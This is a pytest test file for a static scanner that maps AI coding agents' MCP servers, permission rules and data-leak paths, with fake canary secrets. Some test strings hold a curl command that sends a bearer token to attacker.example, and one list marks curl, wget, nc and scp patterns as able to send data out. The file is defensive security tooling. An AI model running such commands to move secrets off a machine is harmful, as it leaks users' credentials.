"""The static scanner, on realistic configuration files inside temporary directories.

Nothing here reads the real home directory: every discovery call names its ``home`` and
``project``. Every secret is an obviously fake canary, and the tests assert that none of
them reaches the graph, a JSON report or the terminal.
"""

from __future__ import annotations

import argparse
import json
import sys
import textwrap
from pathlib import Path

import pytest

from tainttrail import classify, scan
from tainttrail.config import Config
from tainttrail.model import CallAnalysis, HookEvent
from tainttrail.recorder import Recorder
from tainttrail.scan import PermissionRule, ServerEntry, ToolSpec
from tainttrail.store import Store

# Fake secrets. Each is planted in one kind of place a real token ends up in.
GH_TOKEN = "ghp_" + "0a" * 18
CANARIES = {
    "env value": "canary-slack-bot-token-0001",
    "github token in env": GH_TOKEN,
    "header value": "canary-header-value-0002",
    "url query": "canary-url-query-0003",
    "url password": "canary-pg-password-0004",
    "flag value": "canary-arg-apikey-0005",
    "allow rule": "canary-rule-bearer-0006",
    "codex header": "canary-codex-header-0007",
    "gemini bearer": "canary-gemini-bearer-0008",
    "random argument": "Zx9Qw8Er7Ty6Ui5Op4As3Df2Gh1Jk0LmNbVc",
    "docker -e assignment": "canary-docker-env-0009",
    "aws key": "AKIAIOSFODNN7EXAMPLE",
    "path token": "0123456789abcdef0123456789abcdef",
}


def write(path: Path, data=None, *, text: str | None = None) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text if text is not None else json.dumps(data, indent=2), encoding="utf-8")
    return path


@pytest.fixture()
def dirs(tmp_path) -> tuple[Path, Path]:
    """A fake home directory and a project inside it, both empty."""
    home, project = tmp_path / "home", tmp_path / "home" / "work" / "app"
    project.mkdir(parents=True)
    return home, project


def settings(*, allow=(), ask=(), deny=(), mode: str | None = None, **extra) -> dict:
    permissions: dict = {"allow": list(allow), "ask": list(ask), "deny": list(deny)}
    if mode:
        permissions["defaultMode"] = mode
    return {"permissions": permissions, **extra}


def claude_github(home: Path, project: Path, **rules) -> None:
    """Claude Code with the GitHub MCP server in the project's ``.mcp.json``."""
    write(home / ".claude.json", {
        "numStartups": 7, "oauthAccount": {"emailAddress": "someone@example.test"},
        "projects": {str(project): {"allowedTools": [], "mcpServers": {}, "hasTrustDialogAccepted": True}},
    })
    write(project / ".mcp.json", {"mcpServers": {"github": {
        "command": "docker",
        "args": ["run", "-i", "--rm", "-e", "GITHUB_PERSONAL_ACCESS_TOKEN", "ghcr.io/github/github-mcp-server:v0.30"],
        "env": {"GITHUB_PERSONAL_ACCESS_TOKEN": "${GITHUB_PAT}"},
    }}})
    write(project / ".claude" / "settings.json", settings(**rules))


def claude_trio(home: Path, project: Path, **rules) -> None:
    """fetch at user scope, filesystem at project scope, slack at local scope."""
    write(home / ".claude.json", {
        "mcpServers": {"fetch": {"command": "uvx", "args": ["mcp-server-fetch"]}},
        "projects": {str(project): {"mcpServers": {"slack": {
            "type": "stdio", "command": "npx", "args": ["-y", "@modelcontextprotocol/server-slack"],
            "env": {"SLACK_BOT_TOKEN": CANARIES["env value"], "SLACK_TEAM_ID": "T0000000"},
        }}}},
    })
    write(project / ".mcp.json", {"mcpServers": {"filesystem": {
        "command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem@2.3.0", str(project)]}}})
    write(project / ".claude" / "settings.json", settings(**rules))
    write(project / ".claude" / "settings.local.json", {"enabledMcpjsonServers": ["filesystem"]})


def tool(store: Store, name: str, agent: str = "claude-code") -> dict | None:
    row = store.one("MATCH (t:Tool {id: $id}) RETURN properties(t) AS p", {"id": f"{agent}::{name}"})
    return row["p"] if row else None


def servers(store: Store, agent: str = "claude-code") -> dict[str, dict]:
    rows = store.run("MATCH (:Agent {id: $a})-[:CONNECTS]->(s:Server) RETURN s.name AS name, properties(s) AS p",
                     {"a": agent})
    return {r["name"]: r["p"] for r in rows}


def tools_of(store: Store, server_id: str) -> set[str]:
    rows = store.run("MATCH (:Server {id: $id})-[:PROVIDES]->(t:Tool) RETURN t.name AS name", {"id": server_id})
    return {r["name"] for r in rows}


def graph_text(store: Store) -> str:
    """Every property of every node and relationship, as one searchable string."""
    nodes = store.run("MATCH (n) RETURN labels(n) AS labels, properties(n) AS props")
    rels = store.run("MATCH (a)-[r]->(b) RETURN type(r) AS type, properties(r) AS props, "
                     "coalesce(a.id, a.name) AS start, coalesce(b.id, b.name) AS end")
    dump = lambda rows: sorted(json.dumps(row, sort_keys=True, ensure_ascii=False) for row in rows)  # noqa: E731
    return "\n".join(dump(nodes) + dump(rels))


def do_scan(store: Store, home: Path, project: Path, **kw) -> scan.ScanResult:
    return scan.scan(store, home=home, project=project, now=1_800_000_000_000, **kw)


# -- reading files ---------------------------------------------------------------------------


def test_json_with_comments_and_trailing_commas_is_read_and_strings_are_left_alone():
    text = '{\n  // a comment\n  "a": "http://x.test/y", /* block */ "b": [1, 2,],\n  "c": "x, ] // not a comment",\n}'
    assert json.loads(scan.strip_jsonc(text)) == {"a": "http://x.test/y", "b": [1, 2], "c": "x, ] // not a comment"}
    assert json.loads(scan.strip_jsonc('{"a": "quote \\" // still inside", }')) == {"a": 'quote " // still inside'}
    assert scan.strip_jsonc("/* never closed") == ""


# -- redaction ---------------------------------------------------------------------------------


@pytest.mark.parametrize("url,expected", [
    ("https://app:canary-pg-password-0004@db.internal.test:5432/prod?sslmode=require",
     "https://«redacted»@db.internal.test:5432/prod?sslmode=require"),
    ("https://mcp.tavily.test/mcp/?tavilyApiKey=canary-url-query-0003&format=json",
     "https://mcp.tavily.test/mcp/?tavilyApiKey=«redacted»&format=json"),
    ("https://mcp.internal.test/t/0123456789abcdef0123456789abcdef/sse", "https://mcp.internal.test/t/«redacted»/sse"),
    ("https://api.githubcopilot.com/mcp/", "https://api.githubcopilot.com/mcp/"),
    ("https://${MCP_HOST}/mcp?key=${API_KEY}", "https://${MCP_HOST}/mcp?key=${API_KEY}"),
    ("http://[::1]:3000/mcp", "http://[::1]:3000/mcp"),
    ("https://token-only-user@git.internal.test/repo", "https://«redacted»@git.internal.test/repo"),
    ("https://x.test/cb?password=short", "https://x.test/cb?password=«redacted»"),
])
def test_urls_lose_user_info_query_values_and_token_like_path_parts(url, expected):
    assert scan.redact_url(url) == expected
    assert scan.redact_url(expected) == expected, "redacting twice changes nothing"


def test_a_webhook_url_is_secret_as_a_whole():
    # Assembled here so that the repository holds nothing shaped like a live webhook.
    hook = "https://hooks.slack.com/" + "services/" + "/".join(["T01234567", "B01234567", "abcdefghijklmnopqrstuvwx"])
    assert "abcdefghijklmnopqrstuvwx" not in scan.redact_url(hook)
    assert "abcdefghijklmnopqrstuvwx" not in scan.scrub(f"post to {hook} when done")


def test_references_are_kept_and_recognised_in_every_client_syntax():
    for ref in ("${API_KEY}", "${env:API_KEY}", "$API_KEY", "{env:API_KEY}", "${input:api-key}",
                "${{ secrets.API_KEY }}", "Bearer ${API_KEY}", "%API_KEY%", "${API_KEY:-}"):
        assert scan.is_reference(ref), ref
        assert not scan.literal_value(ref), ref
    assert scan.referenced_names("Bearer ${env:MY_TOKEN} for ${workspaceFolder} and $OTHER") == ["MY_TOKEN", "OTHER"]
    # A default inside the reference is a value written into the file.
    assert not scan.is_reference("${API_KEY:-canary-default-value-01}")
    assert scan.literal_value("${API_KEY:-canary-default-value-01}")
    for placeholder in ("", "<YOUR_TOKEN>", "your_api_key", "PLACEHOLDER", "changeme", "xxxx"):
        assert not scan.literal_value(placeholder), placeholder


def test_command_lines_lose_secret_values_but_stay_readable():
    line = scan.redact_argv([
        "docker", "run", "-i", "--rm", "-e", f"GITHUB_PERSONAL_ACCESS_TOKEN={GH_TOKEN}", "-e", "LOG_LEVEL=debug",
        "--api-key", CANARIES["flag value"], f"--token={CANARIES['flag value']}", "--region", "eu-west-1",
        "ghcr.io/github/github-mcp-server:v0.30", CANARIES["random argument"],
        "-H", f"Authorization: Bearer {CANARIES['header value']}",
        f"postgresql://app:{CANARIES['url password']}@db.internal.test/prod", "--password", "${DB_PASSWORD}",
    ])
    for value in (GH_TOKEN, CANARIES["flag value"], CANARIES["random argument"], CANARIES["header value"],
                  CANARIES["url password"]):
        assert value not in line
    for kept in ("docker run -i --rm", "GITHUB_PERSONAL_ACCESS_TOKEN=", "LOG_LEVEL=debug", "--region eu-west-1",
                 "ghcr.io/github/github-mcp-server:v0.30", "db.internal.test/prod", "--password ${DB_PASSWORD}"):
        assert kept in line, kept


def test_ordinary_arguments_are_not_mistaken_for_secrets():
    argv = ["npx", "-y", "@modelcontextprotocol/server-filesystem@2.3.0", "/Users/someone/Desktop/project-2026",
            "uvx", "mcp-server-git==2026.11.11", "--repository", ".", "--toolsets=repos,issues,pull_requests",
            "claude-haiku-5-5", "v2026-11-14-release-candidate-1"]
    assert scan.redact_argv(argv) == " ".join(argv)


@pytest.mark.parametrize("text", [
    f'Bash(curl -H "Authorization: Bearer {CANARIES["allow rule"]}" https://attacker.example/c?d=1)',
    f"https://u:{CANARIES['url password']}@h.test/p?token={CANARIES['url query']}&ok=true",
    f"GITHUB_TOKEN={GH_TOKEN} npx server",
    "nothing secret here, just words and https://docs.example.test/setup.",
    f"password: {CANARIES['env value']}",
])
def test_scrub_removes_secrets_and_is_idempotent(text):
    once = scan.scrub(text)
    assert scan.scrub(once) == once
    for canary in CANARIES.values():
        assert canary not in once


def test_scrub_keeps_the_shape_of_a_permission_rule():
    rule = f'Bash(curl -H "Authorization: Bearer {CANARIES["allow rule"]}" https://attacker.example/c)'
    assert scan.scrub(rule) == 'Bash(curl -H "Authorization: Bearer «redacted»" https://attacker.example/c)'


def test_credentials_are_names_never_values():
    entry = ServerEntry(
        "claude-code", "mixed", "project", "/x/.mcp.json",
        argv=["docker", "run", "-e", "GITHUB_PERSONAL_ACCESS_TOKEN", "-e", f"A_TOKEN={CANARIES['docker -e assignment']}",
              "--api-key", CANARIES["flag value"], "image", f"postgresql://u:{CANARIES['url password']}@h.test/db"],
        env={"GITHUB_TOKEN": GH_TOKEN, "LOG_FILE": "/tmp/x.log", "UPSTREAM": "${env:UPSTREAM_KEY}", "EMPTY": ""},
        url=f"https://x.test/mcp?tavilyApiKey={CANARIES['url query']}",
        headers={"Authorization": "Bearer ${TOKEN_FROM_ENV}", "X-Region": "eu"},
    )
    found = {c.name: c for c in scan.credentials_of(entry, {"credential_env": ["GITHUB_TOKEN"]})}
    assert (found["GITHUB_TOKEN"].kind, found["GITHUB_TOKEN"].literal, found["GITHUB_TOKEN"].secret) == ("env", True, True)
    assert (found["LOG_FILE"].literal, found["LOG_FILE"].secret) == (True, False), "a value, but not a credential"
    assert (found["UPSTREAM"].literal, found["UPSTREAM_KEY"].kind) == (False, "reference")
    assert (found["Authorization"].kind, found["Authorization"].literal) == ("header", False)
    assert found["TOKEN_FROM_ENV"].kind == "reference"
    assert "X-Region" not in found, "a header that is not a credential is not recorded as one"
    assert (found["tavilyApiKey"].kind, found["tavilyApiKey"].literal) == ("url-param", True)
    assert (found["GITHUB_PERSONAL_ACCESS_TOKEN"].literal, found["A_TOKEN"].literal, found["api-key"].literal) == (False, True, True)
    assert found["url user info"].secret
    text = json.dumps([vars(c) for c in found.values()])
    for canary in CANARIES.values():
        assert canary not in text


# -- permission rules ----------------------------------------------------------------------------

BASH = ToolSpec("claude-code", "Bash")
READ = ToolSpec("claude-code", "Read")
GREP = ToolSpec("claude-code", "Grep")
WRITE = ToolSpec("claude-code", "Write")
WEBFETCH = ToolSpec("claude-code", "WebFetch")
GH_GET = ToolSpec("claude-code", "mcp__github__get_issue", "github", "get_issue", "github")
GH_CREATE = ToolSpec("claude-code", "mcp__github__create_issue", "github", "create_issue", "github")


def rules(**kinds) -> list[PermissionRule]:
    return [PermissionRule(kind, text, "/p/.claude/settings.json", "project") for kind, texts in kinds.items()
            for text in texts]


@pytest.mark.parametrize("spec,given,permission,rule,partial", [
    # A rule on part of a tool's use is recorded as partial, never as the tool's permission.
    (BASH, {"allow": ["Bash(curl:*)"]}, "default", "", ["allow Bash(curl:*)"]),
    (BASH, {"deny": ["Bash(curl:*)"], "allow": ["Bash(npm run *)"]}, "default", "", ["deny Bash(curl:*)", "allow Bash(npm run *)"]),
    (BASH, {"allow": ["Bash"]}, "allow", "Bash", []),
    (BASH, {"allow": ["Bash(*)"]}, "allow", "Bash(*)", []),
    (BASH, {"allow": ["Bash"], "ask": ["Bash(git push *)"]}, "allow", "Bash", ["ask Bash(git push *)"]),
    (WEBFETCH, {"allow": ["WebFetch(domain:example.com)"]}, "default", "", ["allow WebFetch(domain:example.com)"]),
    (WEBFETCH, {"allow": ["WebFetch(domain:*)"]}, "allow", "WebFetch(domain:*)", []),
    (WEBFETCH, {"deny": ["WebFetch"]}, "deny", "WebFetch", []),
    # Read(...) rules reach the other file-reading tools and, best effort, the shell.
    (READ, {"deny": ["Read(./.env)"]}, "default", "", ["deny Read(./.env)"]),
    (GREP, {"deny": ["Read(./.env)"]}, "default", "", ["deny Read(./.env)"]),
    (BASH, {"deny": ["Read(./.env)"]}, "default", "", ["deny Read(./.env)"]),
    (WRITE, {"allow": ["Edit(src/**)"]}, "default", "", ["allow Edit(src/**)"]),
    (WRITE, {"deny": ["Edit"]}, "deny", "Edit", []),
    # Claude Code accepts these specifiers and never matches them.
    (WRITE, {"allow": ["Write(./out/**)"]}, "default", "", []),
    (GREP, {"deny": ["Grep(./secrets/**)"]}, "default", "", []),
    # MCP: a server, a server's tool, a glob after the literal server prefix.
    (GH_GET, {"allow": ["mcp__github"]}, "allow", "mcp__github", []),
    (GH_GET, {"allow": ["mcp__github__*"]}, "allow", "mcp__github__*", []),
    (GH_GET, {"allow": ["mcp__github__get_issue"]}, "allow", "mcp__github__get_issue", []),
    (GH_CREATE, {"allow": ["mcp__github__get_issue"]}, "default", "", []),
    (GH_CREATE, {"allow": ["mcp__github__get_*"]}, "default", "", []),
    (GH_GET, {"allow": ["mcp__github__get_*"]}, "allow", "mcp__github__get_*", []),
    (GH_CREATE, {"allow": ["mcp__git"]}, "default", "", []),
    (GH_CREATE, {"allow": ["mcp__githubx__create_issue"]}, "default", "", []),
    (GH_CREATE, {"allow": ["mcp__*"]}, "default", "", []),          # an allow rule needs a literal server
    (GH_CREATE, {"allow": ["*"]}, "default", "", []),
    (GH_CREATE, {"deny": ["mcp__*"]}, "deny", "mcp__*", []),
    (GH_CREATE, {"deny": ["*"]}, "deny", "*", []),
    (BASH, {"deny": ["*"]}, "deny", "*", []),
    (GH_CREATE, {"allow": ["mcp__github__create_issue(title:x)"]}, "default", "", []),   # matches nothing
    (BASH, {"allow": ["mcp__github"]}, "default", "", []),
    # deny beats ask beats allow, whatever the order or how specific the rule is.
    (GH_CREATE, {"allow": ["mcp__github"], "ask": ["mcp__github__create_issue"]}, "ask", "mcp__github__create_issue", []),
    (GH_CREATE, {"allow": ["mcp__github__create_issue"], "ask": ["mcp__github"], "deny": ["mcp__github__create_*"]},
     "deny", "mcp__github__create_*", []),
    (GH_GET, {"allow": ["mcp__github__get_issue"], "ask": ["mcp__github"], "deny": ["mcp__github__create_*"]},
     "ask", "mcp__github", []),
    (ToolSpec("claude-code", "Agent"), {"deny": ["Task"]}, "deny", "Task", []),
    (ToolSpec("claude-code", "Agent"), {"deny": ["Agent(Explore)"]}, "default", "", ["deny Agent(Explore)"]),
])
def test_claude_code_permission_rules(spec, given, permission, rule, partial):
    result = scan.evaluate_permission(spec, rules(**given))
    assert (result.permission, result.rule, result.partial) == (permission, rule, partial)


def test_a_server_name_with_other_characters_is_normalised_as_claude_code_does():
    spec = ToolSpec("claude-code", "mcp__my_server__lookup", scan.normalize_server_name("my.server"), "lookup", "my.server")
    assert spec.server == "my_server"
    assert scan.evaluate_permission(spec, rules(allow=["mcp__my_server__*"])).permission == "allow"
    assert scan.evaluate_permission(spec, rules(allow=["mcp__my.server__*"])).permission == "default"


def test_cursor_and_gemini_rule_dialects():
    slack = ToolSpec("cursor", "mcp__slack__post", "slack", "post", "slack")
    cursor = lambda kind, text: PermissionRule(kind, text, "cli.json", "project", "cursor")  # noqa: E731
    assert scan.evaluate_permission(slack, [cursor("allow", "Mcp(*:*)")]).permission == "allow"
    assert scan.evaluate_permission(slack, [cursor("allow", "Mcp(*:*)"), cursor("deny", "Mcp(slack:po*)")]).permission == "deny"
    assert scan.evaluate_permission(slack, [cursor("allow", "Mcp(datadog:*)")]).permission == "default"
    shell = scan.evaluate_permission(ToolSpec("cursor", "Shell"), [cursor("allow", "Shell(ls)")])
    assert (shell.permission, shell.partial) == ("default", ["allow Shell(ls)"])
    gemini = lambda kind, text: PermissionRule(kind, text, "settings.json", "user", "gemini")  # noqa: E731
    run = ToolSpec("gemini-cli", "run_shell_command")
    assert scan.evaluate_permission(run, [gemini("allow", "run_shell_command")]).permission == "allow"
    assert scan.evaluate_permission(run, [gemini("allow", "run_shell_command(git status)")]).permission == "default"
    assert scan.evaluate_permission(run, [gemini("deny", "run_shell_command"), gemini("allow", "run_shell_command")]).permission == "deny"


@pytest.mark.parametrize("pattern,sends", [
    ("curl:*", True), ("curl *", True), ("wget *", True), ("git push:*", True), ("gh pr create:*", True),
    ("npm publish", True), ("scp:*", True), ("nc:*", True), ("python:*", True), ("bash -c *", True), ("*", True),
    ("git status", False), ("git diff:*", False), ("npm run *", False), ("ls:*", False), ("cat:*", False),
    ("run_in_background:true", False),
])
def test_which_allowed_shell_patterns_can_send_data(pattern, sends):
    assert scan.shell_pattern_sends(pattern) is sends


# -- Claude Code: files, scopes and precedence -----------------------------------------------------


def test_claude_code_reads_all_three_scopes_and_local_beats_project_beats_user(dirs):
    home, project = dirs
    write(home / ".claude.json", {
        "mcpServers": {"notes": {"command": "node", "args": ["user-notes.js"]},
                       "fetch": {"command": "uvx", "args": ["mcp-server-fetch"]}},
        "projects": {
            str(project): {"mcpServers": {"notes": {"command": "node", "args": ["local-notes.js"]}}},
            "/somewhere/else": {"mcpServers": {"other": {"command": "node", "args": ["other.js"]}}},
        },
    })
    write(project / ".mcp.json", {"mcpServers": {
        "notes": {"command": "node", "args": ["project-notes.js"]},
        "tracker": {"command": "node", "args": ["tracker.js"]},
    }})
    [cfg] = scan.discover(home, project, agents=["claude-code"])
    by_name = {s.name: s for s in cfg.servers}
    assert set(by_name) == {"notes", "fetch", "tracker"}, "another project's local servers are not ours"
    assert (by_name["notes"].scope, by_name["notes"].argv) == ("local", ["node", "local-notes.js"])
    assert len(by_name["notes"].notes) == 2, "the shadowed project and user definitions are mentioned"
    assert (by_name["fetch"].scope, by_name["tracker"].scope) == ("user", "project")
    assert cfg.config_paths == [str(home / ".claude.json"), str(project / ".mcp.json")]


def test_a_scan_from_a_subdirectory_finds_the_repository_entry_but_not_one_above_the_repository(dirs):
    home, project = dirs
    (project / ".git").mkdir()
    sub = project / "packages" / "api"
    sub.mkdir(parents=True)
    write(home / ".claude.json", {"projects": {
        str(project): {"mcpServers": {"repo-local": {"command": "node", "args": ["a.js"]}}},
        str(home): {"mcpServers": {"home-local": {"command": "node", "args": ["b.js"]}}},
    }})
    [cfg] = scan.discover(home, sub, agents=["claude-code"])
    assert [s.name for s in cfg.servers] == ["repo-local"]
    [cfg] = scan.discover(home, project.parent, agents=["claude-code"])
    assert cfg.servers == [], "a directory outside the repository does not inherit the home entry"


def test_project_server_approval_and_the_ways_a_server_is_switched_off(dirs):
    home, project = dirs
    names = ["approved", "pending", "rejected", "toggled", "denied", "sdk", "no-type", "off"]
    entries = {n: {"command": "node", "args": [f"{n}.js"]} for n in names}
    entries["sdk"] = {"type": "sdk", "command": "x"}
    entries["no-type"] = {"url": "https://mcp.internal.test/mcp"}
    entries["off"]["disabled"] = True
    write(project / ".mcp.json", {"mcpServers": entries})
    write(home / ".claude.json", {"projects": {str(project): {"disabledMcpServers": ["toggled"]}}})
    write(project / ".claude" / "settings.local.json",
          {"enabledMcpjsonServers": ["approved", "rejected"], "disabledMcpjsonServers": ["rejected"]})
    write(home / ".claude" / "settings.json", {"deniedMcpServers": [{"serverName": "denied"}]})
    [cfg] = scan.discover(home, project, agents=["claude-code"])
    state = {s.name: (s.enabled, s.status) for s in cfg.servers}
    assert state["approved"] == (True, "approved")
    assert state["pending"][0] is True and "pending approval" in state["pending"][1]
    assert state["rejected"][0] is False and "disabledMcpjsonServers" in state["rejected"][1]
    assert state["toggled"][0] is False and "/mcp" in state["toggled"][1]
    assert state["denied"] == (False, "blocked by deniedMcpServers")
    assert state["sdk"][0] is False
    assert state["no-type"][0] is False and "url without type" in state["no-type"][1]
    # "disabled" is a field of other clients. Claude Code does not read it, so the server still loads.
    off = next(s for s in cfg.servers if s.name == "off")
    assert off.enabled is True and "does not read disabled" in " ".join(off.notes)


CLAUDE_GITHUB_ENTRY = {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-github"]}


@pytest.mark.parametrize("field", [
    {"disabled": True}, {"enabled": False}, {"tools": []}, {"tools": ["get_me"]}, {"includeTools": ["get_me"]},
    {"excludeTools": ["create_issue"]}, {"disabledTools": ["create_issue"]},
])
def test_a_field_of_another_client_cannot_hide_a_claude_code_server_or_its_tools(dirs, field):
    """A cloned repository must not be able to switch its server off for the scan only."""
    home, project = dirs
    write(project / ".mcp.json", {"mcpServers": {"github": {**CLAUDE_GITHUB_ENTRY, **field}}})
    write(project / ".claude" / "settings.json", settings(allow=["mcp__github"]))
    with Store(":memory:") as store:
        result = do_scan(store, home, project)
        server = servers(store)["github"]
        assert server["enabled"] is True and server["tools"] > 100
        assert tool(store, "mcp__github__create_issue")["gate"] == "open"
        assert f"Claude Code does not read {next(iter(field))}" in server["notes"]
        assert "does not read" in scan.render_scan(result, None)


def test_each_client_still_reads_its_own_switches(dirs):
    home, project = dirs
    entry = {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-github"]}
    write(project / ".devin" / "mcp_config.json", {"mcpServers": {
        "off": {**entry, "disabled": True}, "narrow": {**entry, "disabledTools": ["create_issue"]}}})
    write(project / ".github" / "mcp.json", {"mcpServers": {
        "none": {**entry, "type": "stdio", "tools": []}, "one": {**entry, "type": "stdio", "tools": ["get_me"]},
        "all": {**entry, "type": "stdio", "tools": ["*"], "disabled": True}}})
    write(project / ".gemini" / "settings.json", {"mcpServers": {
        "picky": {**entry, "includeTools": ["get_me", "create_issue"], "excludeTools": ["create_issue"], "disabled": True}}})
    with Store(":memory:") as store:
        do_scan(store, home, project)
        windsurf, vscode, gemini = (servers(store, a) for a in ("windsurf", "vscode", "gemini-cli"))
        assert windsurf["off"]["enabled"] is False and windsurf["narrow"]["enabled"] is True
        assert "mcp__narrow__create_issue" not in tools_of(store, "windsurf/narrow")
        assert vscode["none"]["enabled"] is False and "tools list is empty" in vscode["none"]["status"]
        assert tools_of(store, "vscode/one") == {"mcp__one__get_me"}
        assert vscode["all"]["enabled"] is True and vscode["all"]["tools"] > 100, "VS Code has no 'disabled' field"
        assert gemini["picky"]["enabled"] is True and tools_of(store, "gemini-cli/picky") == {"mcp_picky_get_me"}


def test_allowlist_and_managed_servers(dirs, tmp_path):
    home, project = dirs
    system = tmp_path / "etc-claude-code"
    write(project / ".mcp.json", {"mcpServers": {"mine": {"command": "node", "args": ["mine.js"]}}})
    write(system / "managed-settings.json", {"allowedMcpServers": [{"serverCommand": ["node", "other.js"]}],
                                             "permissions": {"deny": ["WebFetch"]}})
    [cfg] = scan.discover(home, project, system=system, agents=["claude-code"])
    assert [(s.name, s.enabled, s.status) for s in cfg.servers] == [("mine", False, "not in allowedMcpServers")]
    assert cfg.rules[0].scope == "managed", "managed rules come first"
    write(system / "managed-mcp.json", {"mcpServers": {"corp": {"type": "http", "url": "https://mcp.corp.test/mcp"}}})
    [cfg] = scan.discover(home, project, system=system, agents=["claude-code"])
    state = {s.name: (s.scope, s.enabled) for s in cfg.servers}
    assert state["corp"][0] == "managed"
    assert state["mine"] == ("project", False), "a managed-mcp.json takes exclusive control"
    # Without a system directory nothing outside home and project is opened.
    [cfg] = scan.discover(home, project, agents=["claude-code"])
    assert [s.name for s in cfg.servers] == ["mine"] and all(str(system) not in p for p in cfg.config_paths)


def test_rules_merge_across_files_and_the_highest_precedence_file_is_named(dirs):
    home, project = dirs
    claude_github(home, project, deny=["mcp__github__create_issue"], allow=["mcp__github__get_issue"])
    write(home / ".claude" / "settings.json", settings(allow=["mcp__github"], deny=["mcp__github__create_issue"],
                                                       mode="acceptEdits"))
    write(project / ".claude" / "settings.local.json", settings(ask=["mcp__github__push_files"],
                                                                 deny=["mcp__github__merge_pull_request"],
                                                                 mode="bypassPermissions"))
    with Store(":memory:") as store:
        do_scan(store, home, project)
        create, get, push, merge = (tool(store, f"mcp__github__{n}") for n in
                                    ("create_issue", "get_issue", "push_files", "merge_pull_request"))
        # The same deny rule is in the user and the project file: the project file ranks higher.
        assert (create["permission"], create["permission_source"]) == ("deny", str(project / ".claude" / "settings.json"))
        # A user-level allow still applies: lists merge, they do not replace each other.
        assert (get["permission"], get["permission_rule"]) == ("allow", "mcp__github__get_issue")
        assert tool(store, "mcp__github__list_issues")["permission_source"] == str(home / ".claude" / "settings.json")
        assert (push["permission"], push["gate"]) == ("ask", "ask")
        assert (merge["permission"], merge["permission_source"]) == ("deny", str(project / ".claude" / "settings.local.json"))
        agent = store.one("MATCH (a:Agent {id: 'claude-code'}) RETURN properties(a) AS p")["p"]
        # bypassPermissions from a project-local file does not take effect; the user file's mode does.
        assert (agent["permission_mode"], agent["permission_mode_source"]) == ("acceptEdits", str(home / ".claude" / "settings.json"))
        assert any("bypassPermissions does not take effect" in n for n in agent["notes"])
        assert tool(store, "Write")["gate"] == "open" and tool(store, "Bash")["gate"] == "ask"


@pytest.mark.parametrize("mode,bash,webfetch,read,github", [
    (None, "ask", "ask", "open", "ask"),
    ("default", "ask", "ask", "open", "ask"),
    ("plan", "ask", "ask", "open", "ask"),
    ("acceptEdits", "ask", "ask", "open", "ask"),
    ("bypassPermissions", "open", "open", "open", "open"),
    ("auto", "open", "open", "open", "open"),
    # dontAsk refuses what would prompt. The shell is not refused as a whole: its read-only
    # commands run in every mode, so it stays a way to read files.
    ("dontAsk", "ask", "deny", "open", "deny"),
])
def test_the_default_permission_mode_changes_what_default_means(dirs, mode, bash, webfetch, read, github):
    home, project = dirs
    claude_github(home, project)
    if mode:
        write(home / ".claude" / "settings.json", settings(mode=mode))
    with Store(":memory:") as store:
        do_scan(store, home, project)
        gates = [tool(store, n)["gate"] for n in ("Bash", "WebFetch", "Read", "mcp__github__create_issue")]
        assert gates == [bash, webfetch, read, github]
        assert all(tool(store, n)["permission"] == "default" for n in ("Bash", "WebFetch", "Read"))
        assert store.scalar("MATCH (a:Agent {id: 'claude-code'}) RETURN a.permission_mode") == (mode or "")


def test_ask_and_deny_rules_hold_even_in_bypass_mode(dirs):
    home, project = dirs
    claude_github(home, project, ask=["mcp__github__create_issue"], deny=["WebFetch"])
    write(home / ".claude" / "settings.json", settings(mode="bypassPermissions"))
    with Store(":memory:") as store:
        do_scan(store, home, project)
        assert tool(store, "mcp__github__create_issue")["gate"] == "ask"
        assert tool(store, "WebFetch")["gate"] == "deny"
        assert tool(store, "mcp__github__push_files")["gate"] == "open"


def test_an_allowed_curl_pattern_opens_the_shell_as_a_sink_without_allowing_the_shell(dirs):
    home, project = dirs
    claude_github(home, project, allow=["Bash(curl:*)", "Bash(git status)"], deny=["Read(./.env)"])
    with Store(":memory:") as store:
        do_scan(store, home, project)
        bash = tool(store, "Bash")
        assert bash["permission"] == "default", "a pattern is not a blanket allow"
        assert bash["permission_partial"] == ["deny Read(./.env)", "allow Bash(curl:*)", "allow Bash(git status)"]
        assert (bash["gate"], bash["open_partial"]) == ("open", ["Bash(curl:*)"])
        assert "Bash(curl:*)" in bash["gate_reason"]
    claude_github(home, project, allow=["Bash(git status)", "Bash(npm run *)"])
    with Store(":memory:") as store:
        do_scan(store, home, project)
        bash = tool(store, "Bash")
        assert (bash["gate"], bash["gate_data"], bash["open_partial"]) == ("ask", "open", [])


# -- what a scan writes -----------------------------------------------------------------------------


def test_github_server_puts_all_three_legs_on_one_server(dirs):
    home, project = dirs
    claude_github(home, project, allow=["mcp__github"])
    with Store(":memory:") as store:
        result = do_scan(store, home, project)
        [agent] = result.agents
        github = next(s for s in agent["servers"] if s["name"] == "github")
        assert (github["catalog_id"], github["catalog_match"], github["transport"], github["scope"]) == \
            ("github", "package", "stdio", "project")
        assert min(github["sources"], github["data"], github["sinks"]) > 5, "one server is source, data and sink"
        props = servers(store)["github"]
        assert props["command"] == ("docker run -i --rm -e GITHUB_PERSONAL_ACCESS_TOKEN "
                                    "ghcr.io/github/github-mcp-server:v0.30")
        assert props["source_file"] == str(project / ".mcp.json") and props["enabled"] is True
        issue = tool(store, "mcp__github__issue_read")
        contents = tool(store, "mcp__github__get_file_contents")
        create = tool(store, "mcp__github__create_pull_request")
        assert issue["untrusted_input"] and issue["source_scope"] == "public"
        assert contents["private_data"] and not contents["external_sink"]
        assert create["external_sink"] and create["sink_scope"] == "public" and not create["untrusted_input"]
        assert {t["label_source"] for t in (issue, contents, create)} == {"catalog"}
        assert (create["permission"], create["permission_rule"], create["gate"]) == ("allow", "mcp__github", "open")
        assert create["server"] == "github" and create["server_id"] == "claude-code/github"
        # The capability edges say the same as the properties.
        caps = store.run("MATCH (:Tool {id: 'claude-code::mcp__github__get_file_contents'})-[h:HAS_CAPABILITY]->(c) "
                         "RETURN c.name AS cap, h.source AS source ORDER BY cap")
        assert caps == [{"cap": "private_data", "source": "catalog"}, {"cap": "untrusted_input", "source": "catalog"}]
        creds = store.run("MATCH (:Server {id: 'claude-code/github'})-[:HOLDS]->(c:Credential) "
                          "RETURN c.id AS id, c.name AS name, c.kind AS kind, c.literal AS literal ORDER BY name")
        assert [(c["name"], c["kind"], c["literal"]) for c in creds] == [
            ("GITHUB_PAT", "reference", False), ("GITHUB_PERSONAL_ACCESS_TOKEN", "env", False)]
